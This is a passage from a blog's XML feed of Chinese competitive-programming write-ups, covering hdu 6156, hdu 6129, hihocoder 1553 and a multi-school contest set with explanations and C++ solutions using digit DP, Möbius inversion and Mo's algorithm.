class="number">0.5</span>);</div><div class="line">            ld area=PI*rr*rr;</div><div class="line">            <span class="keyword">if</span> (area&lt;<span class="number">1e-12</span>) <span class="keyword">break</span>;</div><div class="line">            ans+=area;</div><div class="line">            <span class="keyword">if</span> (i&gt;<span class="number">1</span>) ans+=area;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">double</span> <span class="keyword">out</span>=ans;</div><div class="line">        printf(<span class="string">"%.5f\n"</span>,<span class="keyword">out</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h3><p>大佬不愿意透露id，鸣谢csust？</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;题解&quot;&gt;&lt;a href=&quot;#题解&quot; class=&quot;headerlink&quot; title=&quot;题解&quot;&gt;&lt;/a&gt;题解&lt;/h3&gt;&lt;p&gt;比赛之后有大佬说这题可以用圆的反演来做，学习了一下。&lt;/p&gt;
&lt;p&gt;以两个大圆的切点为反演中心，任取一个反演半径，两个大圆会变成两条平行线。
      
    
    </summary>
    
    
      <category term="ACM" scheme="https://www.smlight.xyz/tags/ACM/"/>
    
  </entry>
  
  <entry>
    <title>hdu 6156 Palindrome Function</title>
    <link href="https://www.smlight.xyz/2017/08/20/hdu6156/"/>
    <id>https://www.smlight.xyz/2017/08/20/hdu6156/</id>
    <published>2017-08-20T09:16:54.000Z</published>
    <updated>2018-02-12T03:08:12.211Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><p>定义函数 $f(n,k)$，当 $n$ 在 $k$ 进制表示为回文数时，$f(n,k)=k$；否则 $f(n,k)=1$ 。求 $\sum_{i=L}^{R}\sum_{j=l}^{r}f(i,j)$ 。（$1 \leq T \leq 10^5, 1 \leq L \leq R \leq 10^9, 2 \leq l \leq r \leq 36$）</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>可以发现 $l,r$ 的范围很小，直接枚举 $j$ 代表 $j$ 进制，对于 $i$ 用数位dp统计即可。</p><p>比赛的时候竟然没做这一题。。。蠢死了 ┭┮﹏┭┮ </p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;bits/stdc++.h&gt;</span></div><div class="line">using namespace std;</div><div class="line"></div><div class="line">typedef long long ll;</div><div class="line">const <span class="keyword">int</span> B=<span class="number">40</span>;</div><div class="line"><span class="keyword">int</span> dig[B],tmp[B];</div><div class="line">ll dp[B][B][B];</div><div class="line"><span class="keyword">int</span> base;</div><div class="line"></div><div class="line">ll dfs(<span class="keyword">int</span> <span class="keyword">pos</span>,<span class="keyword">int</span> start,bool limit)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">pos</span>&lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    <span class="keyword">if</span> (!limit&amp;&amp;dp[base][<span class="keyword">pos</span>][start]!=-<span class="number">1</span>) &#123;</div><div class="line">        <span class="keyword">return</span> dp[base][<span class="keyword">pos</span>][start];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">int</span> <span class="keyword">last</span>=limit?dig[<span class="keyword">pos</span>]:base-<span class="number">1</span>;</div><div class="line">    ll res=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=<span class="keyword">last</span>;i++) &#123;</div><div class="line">        tmp[<span class="keyword">pos</span>]=i;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">pos</span>==start&amp;&amp;i==<span class="number">0</span>) &#123;</div><div class="line">            res+=dfs(<span class="keyword">pos</span>-<span class="number">1</span>,start-<span class="number">1</span>,limit&amp;&amp;(i==<span class="keyword">last</span>));</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">pos</span>&lt;(start+<span class="number">1</span>)/<span class="number">2</span>) &#123;</div><div class="line">            <span class="keyword">if</span> (i==tmp[start-<span class="keyword">pos</span>]) &#123;</div><div class="line">                res+=dfs(<span class="keyword">pos</span>-<span class="number">1</span>,start,limit&amp;&amp;(i==<span class="keyword">last</span>));</div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            res+=dfs(<span class="keyword">pos</span>-<span class="number">1</span>,start,limit&amp;&amp;(i==<span class="keyword">last</span>));</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (!limit) dp[base][<span class="keyword">pos</span>][start]=res;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line">ll calc(<span class="keyword">int</span> <span class="keyword">x</span>)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> len=<span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span> (<span class="keyword">x</span>) &#123;</div><div class="line">        dig[len++]=<span class="keyword">x</span>%base;</div><div class="line">        <span class="keyword">x</span>/=base;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> dfs(len-<span class="number">1</span>,len-<span class="number">1</span>,<span class="number">1</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">int</span> main()</div><div class="line">&#123;</div><div class="line">    memset(dp,-<span class="number">1</span>,sizeof(dp));</div><div class="line">    <span class="keyword">int</span> T,cas=<span class="number">0</span>;</div><div class="line">    scanf(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        <span class="keyword">int</span> L,R,l,r;</div><div class="line">        scanf(<span class="string">"%d%d%d%d"</span>,&amp;L,&amp;R,&amp;l,&amp;r);</div><div class="line">        ll ans=<span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (base=l;base&lt;=r;base++) &#123;</div><div class="line">            ll cnt=calc(R)-calc(L-<span class="number">1</span>);</div><div class="line">            ans+=cnt*base+(R-L+<span class="number">1</span>-cnt);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">printf</span>(<span class="string">"Case #%d: %lld\n"</span>,++cas,ans);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;题意&quot;&gt;&lt;a href=&quot;#题意&quot; class=&quot;headerlink&quot; title=&quot;题意&quot;&gt;&lt;/a&gt;题意&lt;/h3&gt;&lt;p&gt;定义函数 $f(n,k)$，当 $n$ 在 $k$ 进制表示为回文数时，$f(n,k)=k$；否则 $f(n,k)=1$ 。求 $\sum_
      
    
    </summary>
    
    
      <category term="ACM" scheme="https://www.smlight.xyz/tags/ACM/"/>
    
  </entry>
  
  <entry>
    <title>2017年多校联训8 部分题解</title>
    <link href="https://www.smlight.xyz/2017/08/18/2017-multi8/"/>
    <id>https://www.smlight.xyz/2017/08/18/2017-multi8/</id>
    <published>2017-08-18T00:45:08.000Z</published>
    <updated>2018-02-21T13:08:53.251Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><p>仅含题解，代码详见<a href="https://github.com/Smlight/ACMer/tree/master/2017/08/17/2017%E5%A4%9A%E6%A0%A18" target="_blank" rel="noopener">github</a>。<del>喜欢的话点个star</del></p><h3 id="1001-Army-Formations"><a href="#1001-Army-Formations" class="headerlink" title="1001.    Army Formations"></a>1001.    Army Formations</h3><p>感觉题意有点绕。。。其实就是每个节点一开始就有整个子树的序列，那么这个序列一定是先输入小的再输入大的才能最优。</p><p>不过这个事情也不是两个有序表合并这么简单，因为对于两个序列，只有把某个序列的数一个一个地插入到另一个才能算出答案。这时候就要用到启发式合并，什么是启发式的策略，通俗来讲就是人脑比较倾向于选择的策略。比如在这里就是把短的序列一个一个插到长的里面，比赛的写的线段树合并结果写了一大坨还没调出来，太蠢了😂。。。然后照着题解写了一个树状数组。。。</p><p>代码见附录，<code>dfs</code>用来得到轻重儿子，<code>solve</code>就是插入和合并，要递归重儿子时直接把轻儿子的全部删掉就行了。</p><h3 id="1002-Battlestation-Operational"><a href="#1002-Battlestation-Operational" class="headerlink" title="1002.    Battlestation Operational"></a>1002.    Battlestation Operational</h3><p>求 $f(n)=\sum_{i=1}^{n}\sum_{j=1}^{i} \left\lceil \frac{i}{j} \right\rceil \left[ (i, j) = 1\right]$ 。</p><p>比赛的时候算是瞎猜了一下。。。其实这题反演的理论性还是很好的。</p><p>以下 $n,i,j,k,d$ 均为正整数，且<strong>用 $(i,j)$ 表示 $i$ 和 $j$ 的最大公约数</strong>。</p><p>记 $h(i)=\sum_{j=1}^{i} \left\lceil \frac{i}{j} \right\rceil \left[ (i, j) = 1\right]$，显然 $f(n)$ 为 $h(i)$ 的前缀和。<br>考虑到 $h(i)$ 中与互质有关，不易直接求解，直接令 $g(i)=\sum_{j=1}^{i} \left\lceil \frac{i}{j} \right\rceil$ 。</p><p>将 $g(i)$ 中的 $\left\lceil \frac{i}{j} \right\rceil$ 按 $(i,j)$ 分类。枚举可能的 $(i,j)=d$，则有 $d|i，j=kd，k\le \frac{i}{d}$ 且 $(i,kd)=d$（注意， $k$ 不是从 $1$ 到 $\frac{i}{d}$ 的全集）。现只对这一类求和：<br>$$ \begin{equation}\begin{split}<br> &amp;\sum_{k=1}^{\frac{i}{d}}\left\lceil \frac{i}{kd} \right\rceil \left[ (i, kd) = d\right] \<br>=&amp; \sum_{k=1}^{\frac{i}{d}}\left\lceil \cfrac{\frac{i}{d}}{k} \right\rceil \left[ (\frac{i}{d}, k) = 1\right] \<br>=&amp;\ h(\frac{i}{d})<br>\end{split}\end{equation}$$<br>当 $d$ 取遍 $i$ 的约数，我们有 $g(i)=\sum_{d|i}h(\frac{i}{d})$。<br>由约数的性质，也即 $g(i)=\sum_{d|i}h(d)$ 。<br>这是标准的莫比乌斯反演形式，可以得到 $h(i)=\sum_{d|i} \mu(d) g(\frac{i}{d})$ 。</p><p>小结一下。</p><p><em>如何求解 $f(n)$：</em>$h(i)$ 的前缀和；</p><p><em>如何求解 $h(i)$：</em>莫比乌斯反演；</p><p><em>如何求解 $\mu(i)$：</em>线性筛模板；</p><p><em>如何求解 $g(i)$：</em>按常规考虑枚举分母（$j$），则对于 $i=j$ 的 $g(i)$ 要+1，对于 $i=j+1…2j$ 的 $g(i)$ 要+2，……，也就是说一个 $j$ 相当于多次区间加法；但是这里不需要动态维护，只需要最终结果，所以利用差分的思想，即 $g’(i)=g(i)-g(i-1)$，回顾上述过程就是对 $g’(i)$ 在 $j,j+1,2j+1…$ 的单点修改，容易很多，最后再对 $g’(i)$ 求和即可。</p><p>鸣谢 <strong>quailty, forever97</strong>！</p><h3 id="1008-Hybrid-Crystals"><a href="#1008-Hybrid-Crystals" class="headerlink" title="1008.    Hybrid Crystals"></a>1008.    Hybrid Crystals</h3><h3 id="1011-Killer-Names"><a href="#1011-Killer-Names" class="headerlink" title="1011.    Killer Names"></a>1011.    Killer Names</h3><p><code>dp[i][j]</code>表示前<code>i</code>个字符恰好用到<code>j</code>种字符的方案数，然后把组合数表和dp表预处理一下，每次 $O(m^2)$ 回答。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Tips&quot;&gt;&lt;a href=&quot;#Tips&quot; class=&quot;headerlink&quot; title=&quot;Tips&quot;&gt;&lt;/a&gt;Tips&lt;/h3&gt;&lt;p&gt;仅含题解，代码详见&lt;a href=&quot;https://github.com/Smlight/ACMer/tree/master
      
    
    </summary>
    
    
      <category term="ACM" scheme="https://www.smlight.xyz/tags/ACM/"/>
    
  </entry>
  
  <entry>
    <title>hihocoder 1553 区间统计</title>
    <link href="https://www.smlight.xyz/2017/08/17/hihocoder1553/"/>
    <id>https://www.smlight.xyz/2017/08/17/hihocoder1553/</id>
    <published>2017-08-17T02:00:21.000Z</published>
    <updated>2018-02-21T13:08:43.236Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><p><a href="http://hihocoder.com/problemset/problem/1553" target="_blank" rel="noopener">#1553 : 区间统计</a> 中文题。</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>首先预处理所有幂次的结果，$O(NK)$；还有IO时间一定要注意。以下均不讨论。</p><p>一看题，无修改区间询问，莫队走起。但是用map复杂度太高了，没算错的话应该是 $O(n^{1.5}logn+m\sqrt{n})$ 。</p><p>考虑到A[]的范围不大，可以对A[]计数，不过没什么卵用。但是对A[]计数以后可以发现，我们不仅可以对值计数还可以对次数计数，也就是说has[i]表示有多少数在当前询问中的<strong>出现次数</strong>等于 i 。</p><p>到这里还是比较容易的，但是如果直接扫has[]复杂度并没有降低 $O(n^{1.5}+mn)$ 。。。</p><p>仍然是考虑分治思想，一次询问最多是整个区间，整个区间中出现次数大于 $\sqrt{n}$ 的数不会超过 $\sqrt{n}$ 个，还可以进行另外的预处理，我就直接<code>multiset</code>暴力了。。。复杂度大概是 $O(n^{1.5}+m\sqrt{n}+(n+m)log{\sqrt{n}})$ 。。。(已经不会算了 _(:△」∠)_ )</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> MO=<span class="number">1000000007</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">100010</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> M=<span class="number">100010</span>;</div><div class="line"><span class="keyword">int</span> len;</div><div class="line"><span class="keyword">int</span> po[N][<span class="number">105</span>];</div><div class="line"><span class="keyword">int</span> cnt[N],has[N];</div><div class="line"><span class="keyword">int</span> a[N],anss[M];</div><div class="line"><span class="built_in">multiset</span>&lt;<span class="keyword">int</span>&gt; ss;</div><div class="line"></div><div class="line"><span class="keyword">namespace</span> fastIO &#123;</div><div class="line">    <span class="meta">#<span class="meta-keyword">define</span> BUF_SIZE 100000</span></div><div class="line">    <span class="comment">//fread -&gt; read</span></div><div class="line">    <span class="keyword">bool</span> IOerror = <span class="number">0</span>;</div><div class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">char</span> <span class="title">nc</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">static</span> <span class="keyword">char</span> buf[BUF_SIZE], *p1 = buf + BUF_SIZE, *pend = buf + BUF_SIZE;</div><div class="line">        <span class="keyword">if</span>(p1 == pend) &#123;</div><div class="line">            p1 = buf;</div><div class="line">            pend = buf + fread(buf, <span class="number">1</span>, BUF_SIZE, <span class="built_in">stdin</span>);</div><div class="line">            <span class="keyword">if</span>(pend == p1) &#123;</div><div class="line">                IOerror = <span class="number">1</span>;</div><div class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> *p1++;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">blank</span><span class="params">(<span class="keyword">char</span> ch)</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> ch == <span class="string">' '</span> || ch == <span class="string">'\n'</span> || ch == <span class="string">'\r'</span> || ch == <span class="string">'\t'</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> &amp;x)</span> </span>&#123;</div><div class="line">        <span class="keyword">char</span> ch;</div><div class="line">        <span class="keyword">while</span>(blank(ch = nc()));</div><div class="line">        <span class="keyword">if</span>(IOerror)</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        <span class="keyword">for</span>(x = ch - <span class="string">'0'</span>; (ch = nc()) &gt;= <span class="string">'0'</span> &amp;&amp; ch &lt;= <span class="string">'9'</span>; x = x * <span class="number">10</span> + ch - <span class="string">'0'</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="meta">#<span class="meta-keyword">undef</span> BUF_SIZE</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> Query &#123;</div><div class="line">    <span class="keyword">int</span> L, R, k, ID, block;</div><div class="line">    Query() &#123;&#125;</div><div class="line">    Query(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> k, <span class="keyword">int</span> ID):L(l), R(r), k(k), ID(ID) &#123;</div><div class="line">        block = l / len;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (<span class="keyword">const</span> Query &amp;rhs) <span class="keyword">const</span> &#123;</div><div class="line">        <span class="keyword">if</span>(block == rhs.block) <span class="keyword">return</span> R &lt; rhs.R;</div><div class="line">        <span class="keyword">return</span> block &lt; rhs.block;</div><div class="line">    &#125;</div><div class="line">&#125; queries[M];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> n)</span></span></div><div class="line">&#123;</div><div class="line">    --has[cnt[n]];</div><div class="line">    <span class="keyword">if</span> (cnt[n]&gt;len) &#123;</div><div class="line">        ss.erase(ss.find(cnt[n]));</div><div class="line">    &#125;</div><div class="line">    ++cnt[n];</div><div class="line">    ++has[cnt[n]];</div><div class="line">    <span class="keyword">if</span> (cnt[n]&gt;len) &#123;</div><div class="line">        ss.insert(cnt[n]);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">erase</span><span class="params">(<span class="keyword">int</span> n)</span></span></div><div class="line">&#123;</div><div class="line">    --has[cnt[n]];</div><div class="line">    <span class="keyword">if</span> (cnt[n]&gt;len) &#123;</div><div class="line">        ss.erase(ss.find(cnt[n]));</div><div class="line">    &#125;</div><div class="line">    --cnt[n];</div><div class="line">    ++has[cnt[n]];</div><div class="line">    <span class="keyword">if</span> (cnt[n]&gt;len) &#123;</div><div class="line">        ss.insert(cnt[n]);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T;</div><div class="line">    fastIO::read(T);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">100000</span>;i++) &#123;</div><div class="line">        po[i][<span class="number">0</span>]=<span class="number">1</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">100</span>;j++) &#123;</div><div class="line">            po[i][j]=<span class="number">1L</span>L*po[i][j<span class="number">-1</span>]*i%MO;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        <span class="keyword">int</span> n, m;</div><div class="line">        fastIO::read(n);</div><div class="line">        fastIO::read(m);</div><div class="line">        len = <span class="built_in">sqrt</span>(n);</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</div><div class="line">            fastIO::read(a[i]);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</div><div class="line">            <span class="keyword">int</span> l,r,k;</div><div class="line">            fastIO::read(l);</div><div class="line">            fastIO::read(r);</div><div class="line">            fastIO::read(k);</div><div class="line">            queries[i] = Query(l, r, k, i);</div><div class="line">        &#125;</div><div class="line">        sort(queries + <span class="number">1</span>, queries + m + <span class="number">1</span>);</div><div class="line">        <span class="keyword">int</span> L = <span class="number">1</span>, R = <span class="number">1</span>;</div><div class="line">        <span class="built_in">memset</span>(cnt,<span class="number">0</span>,<span class="keyword">sizeof</span>(cnt));</div><div class="line">        <span class="built_in">memset</span>(has,<span class="number">0</span>,<span class="keyword">sizeof</span>(has));</div><div class="line">        cnt[a[<span class="number">1</span>]]=<span class="number">1</span>;</div><div class="line">        has[<span class="number">1</span>]=<span class="number">1</span>;</div><div class="line">        ss.clear();</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</div><div class="line">            Query &amp;qi = queries[i];</div><div class="line">            <span class="keyword">while</span>(R &lt; qi.R) insert(a[++R]);</div><div class="line">            <span class="keyword">while</span>(L &gt; qi.L) insert(a[--L]);</div><div class="line">            <span class="keyword">while</span>(R &gt; qi.R) erase(a[R--]);</div><div class="line">            <span class="keyword">while</span>(L &lt; qi.L) erase(a[L++]);</div><div class="line">            ll ans = <span class="number">0</span>;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=len;j++) &#123;</div><div class="line">                ans+=<span class="number">1L</span>L*has[j]*po[j][qi.k]%MO;</div><div class="line">                ans%=MO;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> x:ss) &#123;</div><div class="line">                ans+=po[x][qi.k];</div><div class="line">                ans%=MO;</div><div class="line">            &#125;</div><div class="line">            anss[qi.ID]=ans;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,anss[i]);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h3><p>特别鸣谢 <strong>Claris</strong>！！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;题意&quot;&gt;&lt;a href=&quot;#题意&quot; class=&quot;headerlink&quot; title=&quot;题意&quot;&gt;&lt;/a&gt;题意&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://hihocoder.com/problemset/problem/1553&quot; target=&quot;_blank&quot;
      
    
    </summary>
    
    
      <category term="ACM" scheme="https://www.smlight.xyz/tags/ACM/"/>
    
  </entry>
  
  <entry>
    <title>hdu 6129 Just do it</title>
    <link href="https://www.smlight.xyz/2017/08/17/hdu6129/"/>
    <id>https://www.smlight.xyz/2017/08/17/hdu6129/</id>
    <published>2017-08-17T00:41:10.000Z</published>
    <updated>2018-02-12T03:08:14.682Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><p>有一个长度为 $n$ 的整数序列 ${a_n}$，对其做 $m$ 次前缀异或和，求最终的序列。</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>对这个过程手动模拟几行，注意不要消去，可以发现第 $m$ 次第 $i$ 个数的结果包含了 $C_{m-1+i-j}^{i-j}$ 次第 $j$ 个数($j\le i$) 。</p><p>首先我们需要判断它的奇偶性。奇偶性相当于2进制的结果，2为质数，可以使用Lucas定理。2进制的每一位只有四种情况，其中 $C_{0}^{1}=0，C_{0}^{0}=C_{1}^{0}=C_{1}^{1}=1$ 。</p><p>将 $m-1$ 和 $i-j$ 的每一位展开，在第 $k$ 位上，如果 $m-1$ 和 $i-j$ 都是 1，那么结果就是 0 。</p><p>从小到大枚举 $k$ ，表示 $i-j$ 的第 $k$ 位为 1，若 $m-1$ 的第 $k$ 位不为 1，那么直接更新<strong>a序列本身</strong>。也就是说，每次只用满足 $i-j=2^{k}$ 的 $a[j]$ 更新 $a[i]$，然而此时的 $a[j]$ 已经被 $k$ 取 $0\dots k-1$ 更新过了，所以相当于考虑了 $i-j$ 在 $0\dots k$ 位的所有情况。</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">2e5</span>+<span class="number">5</span>;</div><div class="line"><span class="keyword">int</span> a[N];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T,n,m;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,a+i);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> k=<span class="number">1</span>;m--;</div><div class="line">        <span 